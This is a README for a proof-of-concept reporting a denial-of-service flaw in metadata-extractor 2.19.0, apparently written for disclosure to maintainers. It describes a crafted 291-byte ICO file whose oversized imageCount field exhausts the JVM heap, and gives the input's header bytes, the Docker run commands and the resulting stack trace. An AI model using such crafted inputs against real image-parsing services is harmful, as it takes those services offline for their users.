# metadata-extractor ICO imageCount OOM PoC

This PoC demonstrates a resource exhaustion issue in metadata-extractor 2.19.0 / commit 520e07fed8167863e2245f67d2622f9bb473d017.
A crafted 291-byte ICO-like input has an imageCount field of 0xD641 (54,849). IcoReader.extract() iterates over the declared count and adds metadata directory values until the JVM heap is exhausted.

Files:
- Dockerfile
- run.sh
- PocReproducer.java
- poc_input
- metadata-extractor.jar
- docker_build.log
- docker_run.log

Build and run:

  docker build -t metadata-extractor-ico-oom-poc .
  docker run --rm metadata-extractor-ico-oom-poc

Expected vulnerable behavior:

  PoC size: 291 bytes
  First 8 bytes: 00 00 01 00 41 d6 00 ff
  Calling ImageMetadataReader.readMetadata()...
  Exception in thread "main" java.lang.OutOfMemoryError: Java heap space
      at java.base/java.util.ArrayList.grow(ArrayList.java:239)
      at com.drew.metadata.Directory.setInt(Directory.java:205)
      at com.drew.metadata.ico.IcoReader.extract(IcoReader.java:86)
      at com.drew.imaging.ico.IcoMetadataReader.readMetadata(IcoMetadataReader.java:56)
      at com.drew.imaging.ImageMetadataReader.readMetadata(ImageMetadataReader.java:163)

Notes:
- This PoC does not claim memory corruption, code execution, or information disclosure.
- The confirmed impact is availability/resource exhaustion when attacker-controlled ICO files are parsed by metadata-extractor.
- Exact affected version range should be confirmed by maintainers.
